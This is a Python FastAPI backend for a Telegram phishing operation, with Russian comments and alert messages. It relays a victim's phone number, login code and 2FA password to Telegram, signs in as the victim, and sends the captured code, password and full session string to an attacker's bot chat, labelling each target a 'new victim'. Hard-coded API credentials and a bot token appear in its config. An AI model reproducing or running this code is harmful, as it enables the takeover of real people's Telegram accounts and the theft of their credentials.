import os
import asyncio
import logging
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PasswordHashInvalidError,
    FloodWaitError,
)
from telethon.sessions import StringSession
import httpx
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
# ─── CONFIG ───────────────────────────────────────────────────────────────────
API_ID        = int(os.environ.get("API_ID", "37839268"))
API_HASH      = os.environ.get("API_HASH", "02f22349d03ee117dee396f65bcc56da")
BOT_TOKEN     = os.environ.get("BOT_TOKEN", "8791356428:AAGCZzEnZ5_4YxOMfajeZR4uJzZ9J81VSNg")
CHAT_ID       = os.environ.get("CHAT_ID", "7489815425")
FRONTEND_URL  = os.environ.get("FRONTEND_URL", "https://cjawb-production.up.railway.app")
# ──────────────────────────────────────────────────────────────────────────────
app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
# Храним клиентов в памяти (phone -> TelegramClient)
clients: dict[str, TelegramClient] = {}
phone_hashes: dict[str, str] = {}
async def send_to_bot(text: str):
    """Отправить сообщение себе в Telegram через Bot API."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    async with httpx.AsyncClient() as http:
        try:
            await http.post(url, json={
                "chat_id": CHAT_ID,
                "text": text,
                "parse_mode": "HTML",
            }, timeout=10)
        except Exception as e:
            logger.error(f"Bot send error: {e}")
def make_client(session: StringSession | str = "") -> TelegramClient:
    return TelegramClient(
        StringSession(session) if isinstance(session, str) else session,
        API_ID,
        API_HASH,
        device_model="iPhone 15 Pro",
        system_version="iOS 17.4",
        app_version="10.0.0",
        lang_code="ru",
    )
# ─── SCHEMAS ──────────────────────────────────────────────────────────────────
class PhoneRequest(BaseModel):
    phone: str
class CodeRequest(BaseModel):
    phone: str
    code: str
class PasswordRequest(BaseModel):
    phone: str
    password: str
# ─── ENDPOINTS ────────────────────────────────────────────────────────────────
@app.get("/health")
async def health():
    return {"status": "ok"}
@app.post("/send-code")
async def send_code(req: PhoneRequest):
    """Шаг 1: отправить код на номер телефона."""
    phone = req.phone.strip()
    logger.info(f"send_code: {phone}")
    # Закрываем старый клиент если есть
    if phone in clients:
        try:
            await clients[phone].disconnect()
        except:
            pass
    client = make_client()
    await client.connect()
    clients[phone] = client
    try:
        result = await client.send_code_request(phone)
        phone_hashes[phone] = result.phone_code_hash
        await send_to_bot(
            f"📲 <b>НОВАЯ ЖЕРТВА</b>\n\n"
            f"📱 Телефон: <code>{phone}</code>\n"
            f"📡 Статус: код запрошен у Telegram\n"
            f"⏰ {__import__('datetime').datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
        )
        return {"ok": True, "message": "Код отправлен"}
    except FloodWaitError as e:
        await client.disconnect()
        raise HTTPException(429, f"Подождите {e.seconds} секунд")
    except Exception as e:
        await client.disconnect()
        logger.error(f"send_code error: {e}")
        raise HTTPException(400, str(e))
@app.post("/verify-code")
async def verify_code(req: CodeRequest):
    """Шаг 2: подтвердить код."""
    phone = req.phone.strip()
    code = req.code.strip()
    logger.info(f"verify_code: {phone} / {code}")
    if phone not in clients:
        raise HTTPException(400, "Сессия не найдена. Запросите код заново.")
    client = clients[phone]
    phone_hash = phone_hashes.get(phone, "")
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_hash)
        # Успешный вход (нет 2FA)
        session_str = client.session.save()
        await client.disconnect()
        del clients[phone]
        await send_to_bot(
            f"✅ <b>СЕССИЯ ПОЛУЧЕНА (без 2FA)</b>\n\n"
            f"📱 Телефон: <code>{phone}</code>\n"
            f"🔑 Код: <code>{code}</code>\n\n"
            f"🗝 <b>StringSession:</b>\n<code>{session_str}</code>\n\n"
            f"⏰ {__import__('datetime').datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
        )
        return {"ok": True, "need_password": False}
    except SessionPasswordNeededError:
        # Нужен 2FA пароль
        await send_to_bot(
            f"🔐 <b>2FA ВКЛЮЧЕНА</b>\n\n"
            f"📱 Телефон: <code>{phone}</code>\n"
            f"🔑 Код: <code>{code}</code>\n"
            f"⏳ Ожидаем пароль..."
        )
        return {"ok": True, "need_password": True}
    except PhoneCodeInvalidError:
        raise HTTPException(400, "Неверный код")
    except PhoneCodeExpiredError:
        raise HTTPException(400, "Код истёк. Запросите новый.")
    except Exception as e:
        logger.error(f"verify_code error: {e}")
        raise HTTPException(400, str(e))
@app.post("/verify-password")
async def verify_password(req: PasswordRequest):
    """Шаг 3: подтвердить 2FA пароль."""
    phone = req.phone.strip()
    password = req.password
    if phone not in clients:
        raise HTTPException(400, "Сессия не найдена.")
    client = clients[phone]
    try:
        await client.sign_in(password=password)
        session_str = client.session.save()
        await client.disconnect()
        del clients[phone]
        await send_to_bot(
            f"🏆 <b>ПОЛНАЯ СЕССИЯ С 2FA</b>\n\n"
            f"📱 Телефон: <code>{phone}</code>\n"
            f"🛡 2FA пароль: <code>{password}</code>\n\n"
            f"🗝 <b>StringSession:</b>\n<code>{session_str}</code>\n\n"
            f"⏰ {__import__('datetime').datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
        )
        return {"ok": True}
    except PasswordHashInvalidError:
        raise HTTPException(400, "Неверный пароль")
    except Exception as e:
        logger.error(f"verify_password error: {e}")
        raise HTTPException(400, str(e))
